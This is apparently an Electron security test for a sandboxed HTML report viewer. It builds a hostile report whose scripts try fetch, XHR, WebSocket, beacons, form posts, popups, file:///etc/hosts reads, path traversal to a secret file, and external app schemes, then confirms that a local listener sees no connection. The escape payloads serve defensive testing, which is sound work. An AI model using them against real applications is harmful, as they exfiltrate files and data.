/**
 * Phase 31 §7.3 — the sandboxed HTML view, handed a report that tries every
 * way out. Runs the real html-view.ts in real Electron (see run.ts).
 *
 * The report links remote images, styles, scripts and frames, and — when its
 * scripts are on — fetches, opens sockets, beacons, posts a form, opens
 * windows, navigates to the web and to another report, reads file: and
 * walks out of its folder, all at a listener on 127.0.0.1 that counts every
 * connection. It must count zero; scripts must not run until turned on;
 * the view must stay on the report; the app's own window must not be able
 * to load the report scheme at all.
 */
import { app, BrowserWindow, protocol, session, shell } from 'electron';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { showReport, currentReportView } from '../../src/electron/html-view';
import { REPORT_UID } from './stub-content';

protocol.registerSchemesAsPrivileged([{ scheme: 'ct-html', privileges: { standard: true, secure: true, stream: true } }]);

const failures: string[] = [];
const check = (ok: boolean, what: string) => { console.log(`${ok ? 'ok  ' : 'FAIL'} ${what}`); if (!ok) failures.push(what); };
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));

function fixture(port: number): { root: string; rel: string } {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ct-hostile-html-')));
  const dir = path.join(root, 'reports', 'run');
  fs.mkdirSync(path.join(dir, 'assets'), { recursive: true });
  fs.writeFileSync(path.join(root, 'secret.txt'), 'SECRET-OUTSIDE-THE-REPORT');
  fs.writeFileSync(path.join(dir, 'assets', 'app.css'), 'body { background: rgb(1, 2, 3); }');
  fs.writeFileSync(path.join(dir, 'page2.html'), '<!doctype html><title>page two</title><p>second page</p>');
  const net = `http://127.0.0.1:${port}`;
  fs.writeFileSync(path.join(dir, 'index.html'), `<!doctype html>
<html><head><title>hostile</title>
<meta http-equiv="refresh" content="1;url=${net}/refresh">
<link rel="stylesheet" href="assets/app.css">
<link rel="stylesheet" href="${net}/style.css">
<link rel="prefetch" href="${net}/prefetch">
<script src="${net}/script.js"></script>
</head><body>
<img src="${net}/img.png"><img src="file:///etc/hosts"><img src="../../secret.txt">
<iframe src="${net}/frame"></iframe>
<form id="f" action="${net}/form" method="post"><input name="a" value="b"></form>
<p>report body</p>
<script>
document.title = 'scripts-ran';
const results = {};
const attempt = async (name, fn) => { try { const r = await Promise.race([fn(), new Promise((_, no) => setTimeout(() => no(new Error('no-answer')), 4000))]); results[name] = 'allowed:' + String(r).slice(0, 80); } catch (e) { results[name] = e && e.message === 'no-answer' ? 'no-answer' : 'blocked'; } };
(async () => {
  await attempt('fetch-net', () => fetch('${net}/fetch').then((r) => r.status));
  await attempt('fetch-traversal', () => fetch('../../secret.txt').then((r) => r.text()));
  await attempt('fetch-file', () => fetch('file:///etc/hosts').then((r) => r.text()));
  await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.onload = () => ok(x.status); x.onerror = no; x.open('GET', '${net}/xhr'); x.send(); }));
  await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket('ws://127.0.0.1:${port}/ws'); w.onopen = () => ok('open'); w.onerror = no; }));
  await attempt('beacon', () => { if (!navigator.sendBeacon('${net}/beacon', 'x')) throw new Error('refused'); return 'queued'; });
  await attempt('import', () => import('${net}/module.js'));
  await attempt('window-open', () => { const w = window.open('${net}/popup'); if (!w) throw new Error('refused'); return 'opened'; });
  await attempt('camera', () => navigator.mediaDevices.getUserMedia({ video: true }).then(() => 'granted'));
  await attempt('clipboard', () => navigator.clipboard.readText());
  try { document.getElementById('f').submit(); } catch {}
  document.body.dataset.results = JSON.stringify(results);
})();
</script></body></html>`);
  return { root, rel: 'reports/run/index.html' };
}

async function loaded(timeoutMs = 10_000): Promise<void> {
  const wc = currentReportView()!.webContents;
  if (!wc.isLoading()) return;
  await Promise.race([new Promise<void>((r) => wc.once('did-stop-loading', () => r())), wait(timeoutMs)]);
}

app.whenReady().then(async () => {
  const connections: string[] = [];
  const server = http.createServer((req, res) => { connections.push(`${req.method} ${req.url}`); res.end('reached'); });
  server.on('upgrade', (req, sock) => { connections.push(`UPGRADE ${req.url}`); sock.destroy(); });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const port = (server.address() as { port: number }).port;
  const { root, rel } = fixture(port);
  process.env.HOSTILE_ROOT = root;
  process.env.HOSTILE_REL = rel;

  const win = new BrowserWindow({ width: 1000, height: 700, show: true, webPreferences: { sandbox: true, contextIsolation: true } });
  await win.loadURL('data:text/html,<title>app</title>');
  const bounds = { x: 0, y: 0, width: 1000, height: 700 };

  // Scripts off.
  check((await showReport(win, REPORT_UID, bounds, false)).ok, 'the report is shown');
  await loaded();
  await wait(2500);
  let wc = currentReportView()!.webContents;
  check(wc.getTitle() === 'hostile', `with scripts off, the page's script did not run (title "${wc.getTitle()}")`);
  check(wc.getURL().startsWith(`ct-html://${REPORT_UID}/`), `the meta refresh did not take it off the report (${wc.getURL()})`);

  // Scripts on — a new view.
  check((await showReport(win, REPORT_UID, bounds, true)).ok, 'the report is shown with its scripts');
  await loaded();
  await wait(3000);
  wc = currentReportView()!.webContents;
  check(wc.getTitle() === 'scripts-ran', `with scripts on, the page's script ran (title "${wc.getTitle()}")`);
  // Every attempt answers or gives up after 4s; wait for the page to report them all.
  let results: Record<string, string> = {};
  for (let i = 0; i < 60 && Object.keys(results).length === 0; i++) {
    results = JSON.parse(await wc.executeJavaScript('document.body.dataset.results || "{}"'));
    if (Object.keys(results).length === 0) await wait(500);
  }
  for (const [name, outcome] of Object.entries(results)) {
    // A beacon is queued and then dropped; whether it left is the listener's to say (below).
    // "no-answer" is a request that never completed; whether anything left is the listener's to say.
    check(outcome === 'blocked' || outcome === 'no-answer' || (name === 'beacon' && outcome === 'allowed:queued'), `${name}: ${outcome}`);
  }
  check(Object.keys(results).length >= 10, `every attempt reported (${Object.keys(results).length})`);
  const body = await wc.executeJavaScript('document.body.innerText');
  check(!body.includes('SECRET'), 'nothing from outside the report folder reached the page');
  const bg = await wc.executeJavaScript('getComputedStyle(document.body).backgroundColor');
  check(bg === 'rgb(1, 2, 3)', `the report's own stylesheet loaded (${bg})`);
  check(wc.getURL().startsWith(`ct-html://${REPORT_UID}/`), `still on the report (${wc.getURL()})`);

  // Navigation: out, to another report, and within this one.
  await wc.executeJavaScript(`location.href = 'http://127.0.0.1:${port}/nav'`).catch(() => {});
  await wait(1000);
  check(wc.getURL().startsWith(`ct-html://${REPORT_UID}/`), `a navigation to the web was refused (${wc.getURL()})`);
  await wc.executeJavaScript(`location.href = 'ct-html://ffffffff-0000-4000-8000-000000000000/index.html'`).catch(() => {});
  await wait(1000);
  check(wc.getURL().startsWith(`ct-html://${REPORT_UID}/`), `a navigation to another report was refused (${wc.getURL()})`);
  await wc.executeJavaScript(`location.href = 'page2.html'`).catch(() => {});
  await loaded();
  await wait(800);
  check(wc.getURL().endsWith('/page2.html') && wc.getTitle() === 'page two', `a page of the same report opens (${wc.getURL()})`);

  // Other apps, through the OS: mail, a chat client's scheme, our own artefact scheme.
  for (const target of ['mailto:someone@example.com', 'slack://open', 'vscode://file/etc/hosts', `ct-artefact://${REPORT_UID}`]) {
    await wc.executeJavaScript(`location.href = ${JSON.stringify(target)}`).catch(() => {});
    await wait(700);
  }
  const launched = process.env.HOSTILE_OPEN_MARKER && fs.existsSync(process.env.HOSTILE_OPEN_MARKER)
    ? fs.readFileSync(process.env.HOSTILE_OPEN_MARKER, 'utf8').trim() : '';
  check(launched === '', `no other app was launched through the OS${launched ? `: ${launched}` : ''}`);
  check(wc.getURL().startsWith(`ct-html://${REPORT_UID}/`), `still on the report (${wc.getURL()})`);

  // The control: the stand-in opener does see a launch when one happens.
  if (process.env.HOSTILE_OPEN_MARKER) {
    await shell.openExternal('mailto:control@example.com').catch(() => {});
    await wait(1500);
    check(fs.existsSync(process.env.HOSTILE_OPEN_MARKER), 'control: a launch through the OS is seen by this test');
  }

  // The app's own session has no handler for the scheme: only the view's does.
  check(!session.defaultSession.protocol.isProtocolHandled('ct-html'), 'the app window cannot load a report');

  await wait(1500);
  check(connections.length === 0, `the listener saw no connection${connections.length ? `: ${connections.join(', ')}` : ''}`);

  server.close();
  fs.rmSync(root, { recursive: true, force: true });
  console.log(failures.length ? `\nFAILED (${failures.length})` : '\nthe HTML view is sandboxed: no network, no files outside the report, no way off it');
  app.exit(failures.length ? 1 : 0);
});
